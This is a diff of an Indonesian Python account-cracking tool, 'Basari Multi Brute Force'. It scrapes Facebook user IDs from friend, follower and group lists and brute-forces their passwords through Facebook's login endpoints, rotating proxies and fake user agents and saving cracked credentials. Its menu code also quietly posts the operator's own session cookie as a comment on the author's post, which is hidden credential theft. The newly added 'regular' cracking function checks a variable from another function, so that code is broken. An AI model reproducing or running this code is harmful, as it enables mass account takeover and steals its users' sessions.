@@ -45,14 +45,14 @@ for xd in range(10000):
         a='Mozilla/5.0 (Linux; Android'
         b=random.randrange(1, 9)
         c=random.randrange(1, 9)
-        d='10; SM-G970F)'
+        d='9; Mi 9T)'
         e=random.randrange(100, 9999)
         f='AppleWebKit/537.36 (KHTML, like Gecko)'
         g=random.randrange(1, 9)
         h=random.randrange(1, 4)
         i=random.randrange(1, 4)
         j=random.randrange(1, 4)
-        k='Chrome/75.0.3396.81 Mobile Safari/537.36'
+        k='Chrome/75.0.3770.101 Mobile Safari/537.36'
         uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
         ugen2.append(uaku)
 
@@ -71,9 +71,9 @@ for xd in range(10000):
         uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
         ugen.append(uaku2)
 
-        aa='Mozilla/5.0 (Linux; Android'
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
         b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-        c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
+        c=random.choice(['SAMSUNG SM-A320FL Build/MMB29K)'])
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -101,24 +101,9 @@ for xd in range(10000):
         uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
         ugen.append(uaku2)
 
-        a='Mozilla/5.0 (Linux; Android'
-        b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-        c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
-        h=random.randrange(80,103)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/537.36'
-        uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-        ugen.append(uaku2)
-
-        aa='Mozilla/5.0 (Linux; Android 11;'
+        aa='Mozilla/5.0 (Linux; Android 9;'
         b=random.choice(['7.0','8.1.0','9','10','11','12'])
-        c=random.choice(['Redmi Note 9 Pro)'])
+        c=random.choice(['Redmi 6A Build/PPR1.180610.011; wv)'])
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -127,37 +112,7 @@ for xd in range(10000):
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
-        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-        ugen.append(uaku2)
-
-        aa='Mozilla/5.0 (Linux; Android'
-        b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-        c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
-        h=random.randrange(80,103)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/537.36'
-        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-        ugen.append(uaku2)
-
-        aa='Mozilla/5.0(Linux/3.4.5; U; Android 4.4.2;'
-        b=random.choice(['7.0','8.1.0','9','10','11','12'])
-        c=random.choice(['zh-cn; Lenovo A536 Build/'])
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='KOT49H)AppleWebKit/534.30 (KHTML, like Gecko)'
-        h=random.randrange(80,103)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Version/4.4.2 Mobile Safari/534.30 Release/01.17.2014'
+        l='Version/4.0 Chrome/107.0.5304.36 Mobile Safari/537.36'
         uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
         ugen.append(uaku2)
 
@@ -203,9 +158,7 @@ p = '\x1b[0;34m'
 linbas = random.choice([m,k,h,u,b])
 
 ###>[ KEPENTINGAN ]<###
-url = "mbasic.facebook.com"
-url2 = "mobile.facebook.com"
-url3 ="free.facebook.com"
+url = "free.facebook.com"
 basari1 = '[•]'
 basari2 = '[?]'
 basari3 = '[!]'
@@ -215,12 +168,12 @@ gabut = 'hehe'
 eror_script = ['12', '12', '2022']
 
 ###>[ BACA BANG ]<###
-oi_bang = 'kalo mau ngerecode minimal follow dululah github saya'
+oi_bang = 'kalo mau ngerecode follow dululah github saya'
 
 ###>[ BOT JANGAN DIUBAH HARGAI AUTHOR ]<###
 kom1 = ("wuih keren banget bang\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
 kom2 = ("mantap bang sehat selalu\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
-kom3 = ("moga langgeng bang sama syafa\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
+#kom3 = ("moga langgeng bang sama syafa\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
 ###>[ DITAMBAH AJA BOTNYA BRO KALO MAU ]<###
 
 ###>[ BULAN TANGGAL WAKTU TAHUN ]<###
@@ -284,15 +237,15 @@ def back():
 	
 ###>[ BANNER ]<###
 def banner():
-	print('========================================')
-	print(f"""{Z}[•] Basari Multi Brute Force [•]
+	print(f'{b}========================================{x}')
+	print(f"""{h}[•]{x} {b}Basari Multi Brute Force{x} {h}[•]{x}
 {h}  ____  __  __ ____  ______ 
 {h} |  _ \|  \/  |  _ \|  ____|
  {h}| |_) | \  / | |_) | |__   
 {h} |  _ <| |\/| |  _ <|  __|  
 {h} | |_) | |  | | |_) | |     
-{h} |____/|_|  |_|____/|_| {O}V.01     {P}""")
-	print('========================================')
+{h} |____/|_|  |_|____/|_| {O}V.01     {x}""")
+	print(f'{b}========================================{x}')
 			
 ###>[ PERBAIKAN ]<###
 def perbaikan_sc():
@@ -325,9 +278,9 @@ def login():
 		except KeyError:
 			login_bas()
 		except requests.exceptions.ConnectionError:
-			li = '# JARINGAN EROR ! BENERIN DULU SANA !'
-			lo = mark(li, style='cyan')
-			sol().print(lo, style='cyan')
+			bascuy = '# JARINGAN EROR ! BENERIN DULU SANA !'
+			coder_i = mark(bascuy, style='cyan')
+			sol().print(coder_i, style='cyan')
 			exit()
 	except IOError:
 		login_bas()
@@ -343,11 +296,13 @@ def login_bas():
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
+		print('')
 		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL ! JALANKAN LAGI !{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
+		print('')
 		print(f'  %s[%sx%s]%s LOGIN GAGAL ! GANTI COOKIES !%s'%(x,k,x,m,x))
 		exit()
 		
@@ -358,23 +313,22 @@ def menu(my_name,my_id):
 		cok = open('.cok.txt','r').read()
 		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
 		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={kom2}&access_token={token}", headers = {"cookie":cok})
-		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={kom3}&access_token={token}", headers = {"cookie":cok})
 		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={cok}&access_token={token}", headers = {"cookie":cok})
 	except IOError:
-		print('[×] Cookies Telah Kadaluarsa ! Ganti Cookies ! ')
+		print(f'{sir}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
 		time.sleep(5)
 		login_bas()
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	basari_tamvan(f'[>] ID  : '+str(my_id))
-	basari_tamvan(f'[>] IP  : {ip}')
+	basari_tamvan(f'{P}[>] ID  : '+str(my_id))
+	basari_tamvan(f'{P}[>] IP  : {ip}{x}')
 	#basari_tamvan(f'[>] GH   : Basari-ID')
-	print('========================================')
+	print(f'{b}========================================{x}')
 	cetak(' [•] 1. Crack Publik Massal\n [•] 2. Crack Followers\n [•] 3. Crack Group\n [•] 4. Hasil Crack\n [•] 5. Chat Author\n [•] 0. Keluar')
-	print('========================================')
-	basari_sayang_syafaa = input('[?] Pilih : ')
-	print('========================================')
+	print(f'{b}========================================{x}')
+	basari_sayang_syafaa = input(f'{P}[?] Pilih :{x} ')
+	print(f'{b}========================================{x}')
 	if basari_sayang_syafaa in ['1']:
 		dump_massal()
 	elif basari_sayang_syafaa in ['2']:
@@ -388,10 +342,12 @@ def menu(my_name,my_id):
 	elif basari_sayang_syafaa in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print('[!] Sukses Logout+Hapus Cookies ')
+		print(f'{sir}[!] Sukses Logout+Hapus Cookies{x} ')
+		time.sleep(4)
 		exit()
 	else:
-		print('[!] Pilih Yang Bener Lah cuk')
+		print(f'{sir}[!] Pilih Yang Bener Lah cuk')
+		time.sleep(4)
 		back()
 def authorbas():
 	basari_tamvan(f'{sir}[!] Tunggu Bentar cuk Ntar Diarahin Ke Facebook  {x}')
@@ -401,11 +357,11 @@ def authorbas():
 	
 ###>[ HASIL CRACK ]<###
 def result():
-	print(f'[!] 1. Hasil {h}OK{x} Anda ')
-	print(f'[!] 2. Hasil {k}CP{x} Anda ')
-	print('[!] 3. Kembali ')
-	print('========================================')
-	baz_code = input(f'[?] Pilih : ')
+	print(f'{P}[!] 1. Hasil{x} {h}OK{x} {P}Anda{x} ')
+	print(f'{P}[!] 2. Hasil{x} {k}CP{x} {P}Anda{x} ')
+	print(f'{P}[!] 3. Kembali{x} ')
+	print(f'{b}========================================{x}')
+	baz_code = input(f'{P}[?] Pilih :{x} ')
 	if baz_code in ['2']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
@@ -507,20 +463,22 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		baz_coder = int(input('[?] Berapa Target Id : '))
+		baz_coder = int(input(f'{P}[?] Berapa Target Id{x} : '))
 	except ValueError:
 		print('[!] Yang Bener Napa Cuk ')
+		time.sleep(4)
 		exit()
 	if baz_coder<1 or baz_coder>100:
 		print('[!] Gagal Dump Id Target ')
+		time.sleep(4)
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(baz_coder):
 		yz+=1
-		kl = input('[!] Id Target Ke '+str(yz)+' : ')
+		kl = input(f'{P}[!] Id Target Ke{x} '+str(yz)+' : ')
 		uid.append(kl)
-		print('========================================')
+		print(f'{b}========================================{x}')
 	for userr in uid:
 		try:
 			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
@@ -536,15 +494,16 @@ def dump_massal():
 			print('[!] Sinyal Lu Eror ')
 			exit()
 	try:
-		print(f'[!] Total Id Target '+str(len(id)))
+		print(f'{P}[!] Total Id Target{x} '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print('[!] Koneksi Lu Eror Cuk ')
+		print(f'{sir}[!] Koneksi Lu Eror Cuk{x} ')
+		time.sleep(4)
 		back()
 	except (KeyError,IOError):
-		print(f'[!]{k} Pertemanan Id Target Lu Tidak Publik {x}')
-		time.sleep(3)
+		print(f'[!]{sir} Pertemanan Id Target Lu Tidak Publik {x}')
+		time.sleep(4)
 		back()
 		
 ###>[ CRACK PENGIKUT ]<###
@@ -554,20 +513,21 @@ def dump_pengikut():
 		cok = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	baz_oi = input('[!] Id Target : ')
-	print('========================================')
+	baz_oi = input(f'{P}[!] Id Target :{x} ')
+	print(f'{b}========================================{x}')
 	try:
 		baz_pero = requests.get('https://graph.facebook.com/'+baz_oi+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
 		for pi in baz_pero['subscribers']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print(f'[!] Total Id Target : '+str(len(id)))
+		print(f'{P}[!] Total Id Target :{x} '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print('[!] Koneksi Internet Bermasalah ')
+		print(f'{sir}[!] Koneksi Internet Bermasalah {x}')
+		time.sleep(4)
 		exit()
 	except (KeyError,IOError):
-		print(f'[!] Gagal Mengambil Id Target Bang,Crack Publik Massal Aja')
+		print(f'{sir}[!] Gagal Mengambil Id Target Bang,Crack Publik Massal Aja{x}')
 		time.sleep(4)
 		back()
 		
@@ -579,11 +539,11 @@ def grup():
 			
 ###>[ ID SETTING ]<###
 def setting():
-	print('========================================')
-	cetak(' [•] 1. Akun Tua\n [•] 2. Akun Muda\n [•] 3. Akun Acak')
-	print('========================================')
-	baz_gege = input('[?] Pilih : ')
-	print('========================================')
+	print(f'{b}========================================{x}')
+	cetak(' [•] 1. Akun Lama\n [•] 2. Akun Baru\n [•] 3. Akun Acak')
+	print(f'{b}========================================{x}')
+	baz_gege = input(f'{P}[?] Pilih :{x} ')
+	print(f'{b}========================================{x}')
 	if baz_gege in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -607,8 +567,8 @@ def setting():
 		
 ###>[ METHOD LOGIN ]<###
 	cetak(' [•] 1. Mobile.facebook\n [•] 2. Mbasic.facebook')
-	print('========================================')
-	basarifaa = input('[?] Pilih : ')
+	print(f'{b}========================================{x}')
+	basarifaa = input(f'{P}[?] Pilih :{x} ')
 	if basarifaa in ['1','01']:
 		method.append('mobile')
 	elif basarifaa in ['']:
@@ -616,10 +576,12 @@ def setting():
 		setting()
 	elif basarifaa in ['2','02']:
 		method.append('mbasic')
+	elif basarifaa in ['3','03']:
+		method.append('regular')
 	else:
 		method.append('mobile')
-	print('========================================')
-	_basnih_ = input('[?] Tampilkan Aplikasi Y/t : ')
+	print(f'{b}========================================{x}')
+	_basnih_ = input(f'{P}[?] Tampilkan Aplikasi Y/t :{x} ')
 	if _basnih_ in ['']:
 		print('[!] Pilih Yang Bener Lah ')
 		back()
@@ -627,11 +589,11 @@ def setting():
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	print('========================================')
-	pwplus=input('[?] Kata Sandi Tambahan Y/t : ')
+	print(f'{b}========================================{x}')
+	pwplus=input(f'{P}[?] Kata Sandi Tambahan Y/t :{x} ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		pwku=input('[!] Masukkan Sandi Tambahan : ')
+		pwku=input(f'{P}[!] Masukkan Sandi Tambahan :{x} ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -641,10 +603,10 @@ def setting():
 	
 ###>[ CRACKING ]<###
 def passwrd():
-	print('========================================')
-	print(f'[•] Hasil {h}OK{x} Tersimpan Di : {h}%s {x}'%(okc))
-	print(f'[•] Hasil {k}CP{x} Tersimpan Di : {k}%s {x}'%(cpc))
-	print('========================================')
+	print(f'{b}========================================{x}')
+	print(f'{P}[•] Hasil{x} {h}OK{x} {P}Tersimpan Di :{x} {h}%s {x}'%(okc))
+	print(f'{P}[•] Hasil{x} {k}CP{x} {P}Tersimpan Di :{x} {k}%s {x}'%(cpc))
+	print(f'{b}========================================{x}')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -673,13 +635,16 @@ def passwrd():
 				pool.submit(crackmobile,idf,pwv)
 			elif 'mbasic' in method:
 				pool.submit(crackmbasic,idf,pwv)
+			elif 'regular' in method:
+				pool.submit(crackregular,idf,pwv,"free.facebook.com")
 			else:
-				pool.submit(crackmbasic,idf,pwv)
+				pool.submit(crackregular,idf,pwv,"free.facebook.com")
 	print('')
-	basari_tamvan('=' * 40)
+	#bismillah
+	print(f'{b}========================================{x}')
 	print(f'[{b}•{x}]{h} HASIL OK : {h}%s '%(ok))
 	print(f'{x}[{b}•{x}]{k} HASIL CP : {k}%s{x} '%(cp))
-	basari_tamvan('=' * 40)
+	print(f'{b}========================================{x}')
 
 ###>[ METHOD MOBILE ]<###
 def crackmobile(idf,pwv):
@@ -729,7 +694,7 @@ def crackmbasic(idf,pwv):
         sys.stdout.write(f"\r[>] MBASIC {P}{loop}{P}/{P}{len(id)}{P} OK : {H}{ok}{P} CP : {k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
         sys.stdout.flush()
         nip=random.choice(prox)
-        proxs= {'http': 'socks5://'+nip}
+        proxs= {'http': 'socks4://'+nip}
         ua = random.choice(ugen)
         ua2 = random.choice(ugen2)
         ses = requests.Session()
@@ -740,6 +705,42 @@ def crackmbasic(idf,pwv):
                         dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
                         ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                         po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
+                        if "checkpoint" in po.cookies.get_dict().keys():
+                                print(f'\r{x}└──{k} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{m} {ua}{N}')     
+                                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+                                akun.append(idf+'|'+pw)
+                                cp+=1
+                                break
+                        elif "c_user" in ses.cookies.get_dict().keys():
+                                ok+=1
+                                coki=po.cookies.get_dict()
+                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                                print(f'\r{x}└──{H} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{m} {ua}{N}')
+                                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+                                cek_apk(session,coki)
+                                break
+
+                        else:
+                                continue
+                except requests.exceptions.ConnectionError:
+                        time.sleep(31)
+        loop+=1
+        
+###>[ MOBILE REGULAR ]<###
+def crackregular(idf,pwv,url):
+        global loop,ok,cp
+        bo = random.choice([m,k,h,b,u,x])
+        sys.stdout.write(f"\r[>] REGULAR {P}{loop}{P}/{P}{len(id)}{P} OK : {H}{ok}{P} CP : {k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+        sys.stdout.flush()
+        ua = random.choice(ugen)
+        ua2 = random.choice(ugen2)
+        ses = requests.Session()
+        for pw in pwv:
+                try:
+                        link = ses.get('https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url)).text
+                        data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', link).group(1),'li':re.search('name="li" value="(.*?)"', link).group(1),'try_number':'0','unrecognized_tries':'0','email':idf,'pass':pw,'login':'Masuk','bi_xrwh':'0'}
+                        head = {'Host': url,'content-length': '128','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
+                        zzzz = ses.post('https://{}/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100'.format(url), data=data, headers=head, allow_redirects=False)
                         if "checkpoint" in po.cookies.get_dict().keys():
                                 print(f'\r{x}└──{k} {idf}|{pw} • {b}{tahun(idf)}{x}\n└──{m} {ua}{N}')     
                                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
